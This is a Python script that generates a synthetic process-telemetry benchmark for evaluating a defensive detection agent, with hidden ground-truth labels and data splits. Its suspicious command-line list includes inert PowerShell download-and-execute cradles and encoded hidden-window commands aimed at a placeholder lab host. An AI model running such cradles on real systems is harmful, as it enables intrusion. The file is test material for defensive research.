#!/usr/bin/env python3
"""Synthetic telemetry generator for CYBER-EVO.

Realizes the telemetry contract documented in
``telemetry/telemetry-schema-S001.md``.

The generator produces two files:

* ``telemetry/events.jsonl``        -- Blue-visible telemetry ONLY.
* ``telemetry/ground-truth.jsonl``  -- evaluator-only labels, keyed by case id.

A *case* is one evaluation unit: a short sequence of events that the Blue
agent must judge, plus the hidden ground truth for that judgement. Events
carry an opaque ``case_id`` so the evaluator can join decisions to labels; the
id encodes nothing about the answer.

Design rules enforced here (see schema doc sections 2 and 5):

* No label leakage -- events never contain the technique id, attack flag,
  split, or telemetry condition.
* Observable evidence only -- events use the documented process-telemetry
  schema.
* Degradation is explicit -- ``missing`` / ``noisy`` / ``delayed`` conditions
  are applied to the events, and whether a null was natural or introduced is
  recorded in ground truth.
* Reproducibility -- everything derives from a single seed, recorded in the
  manifest.

All telemetry is synthetic. Nothing here executes a real command; suspicious
command lines are inert strings chosen to resemble the patterns a defensive
sensor would see.
"""
from __future__ import annotations

import argparse
import json
import random
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
TELEMETRY_DIR = REPO_ROOT / "telemetry"

SCHEMA_VERSION = "S001-v1"
ATTACK_VERSION = "ATT&CK-unpinned"  # pin before any formal experiment

# ---------------------------------------------------------------------------
# Scenario catalogue (data-driven so S002..S008 slot in later)
# ---------------------------------------------------------------------------

HOSTS = ["WIN-01", "WIN-02", "WIN-03", "FIN-07", "HR-04"]
USERS = ["alice", "bob", "carol", "dave", "svc_backup"]

# Parents that are unusual ancestors for an interactive shell -> suspicious.
ANOMALOUS_PARENTS = ["winword.exe", "excel.exe", "outlook.exe",
                     "wscript.exe", "mshta.exe"]
# Parents that are ordinary for a shell -> benign context.
BENIGN_PARENTS = ["explorer.exe", "cmd.exe", "powershell_ise.exe",
                  "services.exe", "taskeng.exe"]

# Inert command-line strings. Suspicious ones carry tokens real detections key
# on (encoding, download cradles, hidden windows, policy bypass); benign ones
# are ordinary admin activity.
SUSPICIOUS_CMDLINES = [
    "powershell.exe -nop -w hidden -enc <base64_blob>",
    "powershell.exe -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://<lab>/a')",
    "powershell.exe -WindowStyle Hidden -EncodedCommand <base64_blob>",
    "powershell.exe -c IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<blob>')))",
    "powershell.exe -nop -NonInteractive -Command Invoke-WebRequest http://<lab>/p -OutFile $env:TEMP\\x",
]
BENIGN_CMDLINES = [
    "powershell.exe -Command Get-ChildItem C:\\Users -Recurse",
    "powershell.exe -Command Get-Process | Sort-Object CPU",
    "powershell.exe -Command Import-Module ActiveDirectory; Get-ADUser alice",
    "powershell.exe -Command Get-Service | Where-Object Status -eq Running",
    "powershell.exe -Command $PSVersionTable",
    "powershell.exe -File C:\\Scripts\\nightly-backup.ps1",
]
# Benign activity that *looks* alarming -- the false-positive trap: a legit
# admin using a bypass/download flag for an approved task.
BENIGN_LOOKALIKE_CMDLINES = [
    "powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\approved-deploy.ps1",
    "powershell.exe -Command Invoke-WebRequest https://internal-repo/pkg.msi -OutFile pkg.msi",
]

# Irrelevant benign events injected under the ``noisy`` condition.
NOISE_PROCESSES = [
    ("chrome.exe", "explorer.exe", "chrome.exe --type=renderer"),
    ("teams.exe", "explorer.exe", "teams.exe /background"),
    ("svchost.exe", "services.exe", "svchost.exe -k netsvcs"),
    ("OneDrive.exe", "explorer.exe", "OneDrive.exe /background"),
]


@dataclass
class Case:
    """One evaluation unit before materialisation into events."""
    case_id: str
    scenario_id: str
    technique_id: str | None
    attack_present: bool
    generalization_category: str
    # chosen parent/cmdline define the core event
    parent: str
    cmdline: str | None
    condition: str  # clean | missing | noisy | delayed
    split: str      # adaptation | validation | final_test
    expected_detection: bool
    expected_response: str
    null_reason: str | None = None  # why command_line is null, if it is
    events: list[dict] = field(default_factory=list)


def _iso(ts: datetime) -> str:
    return ts.strftime("%Y-%m-%dT%H:%M:%SZ")


def build_cases(rng: random.Random, n: int) -> list[Case]:
    """Create a balanced set of S001 cases with varied difficulty."""
    cases: list[Case] = []
    # Roughly half attack, half benign.
    n_attack = n // 2
    n_benign = n - n_attack

    def new_id(i: int) -> str:
        return f"C{i:04d}"

    idx = 0
    # --- attack cases: vary which signals are present ---
    for _ in range(n_attack):
        # difficulty: both signals / parent only / cmdline only
        flavour = rng.choice(["both", "parent_only", "cmdline_only"])
        if flavour == "both":
            parent = rng.choice(ANOMALOUS_PARENTS)
            cmdline = rng.choice(SUSPICIOUS_CMDLINES)
        elif flavour == "parent_only":
            parent = rng.choice(ANOMALOUS_PARENTS)
            cmdline = rng.choice(BENIGN_CMDLINES)
        else:  # cmdline_only
            parent = rng.choice(BENIGN_PARENTS)
            cmdline = rng.choice(SUSPICIOUS_CMDLINES)
        cases.append(Case(
            case_id=new_id(idx), scenario_id="S001", technique_id="T1059.001",
            attack_present=True, generalization_category="known_technique",
            parent=parent, cmdline=cmdline, condition="clean",
            split="adaptation", expected_detection=True,
            expected_response="investigate",
        ))
        idx += 1

    # --- benign cases: mostly clearly benign, some look-alike FP traps ---
    for _ in range(n_benign):
        if rng.random() < 0.25:
            parent = rng.choice(BENIGN_PARENTS)
            cmdline = rng.choice(BENIGN_LOOKALIKE_CMDLINES)
        else:
            parent = rng.choice(BENIGN_PARENTS)
            cmdline = rng.choice(BENIGN_CMDLINES)
        cases.append(Case(
            case_id=new_id(idx), scenario_id="S001", technique_id=None,
            attack_present=False, generalization_category="known_technique",
            parent=parent, cmdline=cmdline, condition="clean",
            split="adaptation", expected_detection=False,
            expected_response="no_action",
        ))
        idx += 1

    rng.shuffle(cases)
    _assign_conditions(rng, cases)
    _assign_splits(rng, cases)
    return cases


def _assign_conditions(rng: random.Random, cases: list[Case]) -> None:
    """Spread telemetry conditions across cases (one change at a time)."""
    conditions = ["clean", "missing", "noisy", "delayed"]
    # ~40% clean, rest split among the three degradations.
    for c in cases:
        r = rng.random()
        if r < 0.40:
            c.condition = "clean"
        elif r < 0.60:
            c.condition = "missing"
        elif r < 0.80:
            c.condition = "noisy"
        else:
            c.condition = "delayed"


def _assign_splits(rng: random.Random, cases: list[Case]) -> None:
    """Stratified 60/20/20 split so each split holds both classes."""
    for present in (True, False):
        group = [c for c in cases if c.attack_present is present]
        rng.shuffle(group)
        n = len(group)
        n_adapt = int(round(n * 0.60))
        n_val = int(round(n * 0.20))
        for i, c in enumerate(group):
            if i < n_adapt:
                c.split = "adaptation"
            elif i < n_adapt + n_val:
                c.split = "validation"
            else:
                c.split = "final_test"


def materialise(rng: random.Random, cases: list[Case]) -> None:
    """Turn each case into concrete telemetry events, applying its condition."""
    base = datetime(2026, 10, 13, 10, 0, 0, tzinfo=timezone.utc)
    for n, c in enumerate(cases):
        host = rng.choice(HOSTS)
        user = rng.choice(USERS)
        ppid = rng.randint(1000, 3000)
        pid = rng.randint(3000, 9000)
        ts = base + timedelta(minutes=n * 3, seconds=rng.randint(0, 59))

        cmdline = c.cmdline
        if c.condition == "missing":
            # Key evidence removed on purpose.
            cmdline = None
            c.null_reason = "introduced_by_experiment"

        core = {
            "case_id": c.case_id,
            "timestamp": _iso(ts),
            "host": host,
            "user": user,
            "process": "powershell.exe",
            "parent_process": c.parent,
            "process_id": pid,
            "parent_process_id": ppid,
            "command_line": cmdline,
            "integrity_level": rng.choice(["Medium", "High"]),
            "event_source": "synthetic_process_telemetry",
        }

        evs = [core]

        if c.condition == "noisy":
            # Inject irrelevant benign events inside the same case window.
            for _ in range(rng.randint(2, 4)):
                proc, par, cl = rng.choice(NOISE_PROCESSES)
                noise_ts = ts + timedelta(seconds=rng.randint(1, 120))
                evs.append({
                    "case_id": c.case_id,
                    "timestamp": _iso(noise_ts),
                    "host": host,
                    "user": user,
                    "process": proc,
                    "parent_process": par,
                    "process_id": rng.randint(3000, 9000),
                    "parent_process_id": rng.randint(1000, 3000),
                    "command_line": cl,
                    "integrity_level": "Medium",
                    "event_source": "synthetic_process_telemetry",
                })

        if c.condition == "delayed":
            # Core event arrives late and out of order relative to its window.
            delayed_ts = ts + timedelta(minutes=rng.randint(10, 45))
            core["timestamp"] = _iso(delayed_ts)

        rng.shuffle(evs)  # sensors do not guarantee ordering
        c.events = evs


def write_dataset(cases: list[Case], seed: int) -> dict:
    TELEMETRY_DIR.mkdir(parents=True, exist_ok=True)
    events_path = TELEMETRY_DIR / "events.jsonl"
    gt_path = TELEMETRY_DIR / "ground-truth.jsonl"
    manifest_path = TELEMETRY_DIR / "dataset-manifest.json"

    # Blue-visible events (no labels).
    with events_path.open("w", encoding="utf-8", newline="\n") as f:
        for c in cases:
            for ev in c.events:
                f.write(json.dumps(ev) + "\n")

    # Evaluator-only ground truth.
    with gt_path.open("w", encoding="utf-8", newline="\n") as f:
        for c in cases:
            f.write(json.dumps({
                "case_id": c.case_id,
                "scenario_id": c.scenario_id,
                "technique_id": c.technique_id,
                "attack_present": c.attack_present,
                "expected_detection": c.expected_detection,
                "expected_response": c.expected_response,
                "telemetry_condition": c.condition,
                "null_reason": c.null_reason,
                "split": c.split,
                "generalization_category": c.generalization_category,
                "schema_version": SCHEMA_VERSION,
            }) + "\n")

    manifest = {
        "schema_version": SCHEMA_VERSION,
        "attack_version": ATTACK_VERSION,
        "seed": seed,
        "generated_at": _iso(datetime.now(timezone.utc)),
        "n_cases": len(cases),
        "n_events": sum(len(c.events) for c in cases),
        "class_balance": {
            "attack": sum(c.attack_present for c in cases),
            "benign": sum(not c.attack_present for c in cases),
        },
        "splits": {
            s: sum(c.split == s for c in cases)
            for s in ("adaptation", "validation", "final_test")
        },
        "conditions": {
            cond: sum(c.condition == cond for c in cases)
            for cond in ("clean", "missing", "noisy", "delayed")
        },
    }
    manifest_path.write_text(json.dumps(manifest, indent=2) + "\n",
                             encoding="utf-8")
    return manifest


def main() -> None:
    ap = argparse.ArgumentParser(description="Generate synthetic CYBER-EVO telemetry (S001).")
    ap.add_argument("--seed", type=int, default=1337)
    ap.add_argument("--n-cases", type=int, default=60)
    args = ap.parse_args()

    rng = random.Random(args.seed)
    cases = build_cases(rng, args.n_cases)
    materialise(rng, cases)
    manifest = write_dataset(cases, args.seed)

    print("[generate_telemetry] wrote dataset")
    print(f"  cases      : {manifest['n_cases']} "
          f"(attack={manifest['class_balance']['attack']}, "
          f"benign={manifest['class_balance']['benign']})")
    print(f"  events     : {manifest['n_events']}")
    print(f"  splits     : {manifest['splits']}")
    print(f"  conditions : {manifest['conditions']}")
    print(f"  seed       : {manifest['seed']}  schema={manifest['schema_version']}")


if __name__ == "__main__":
    main()
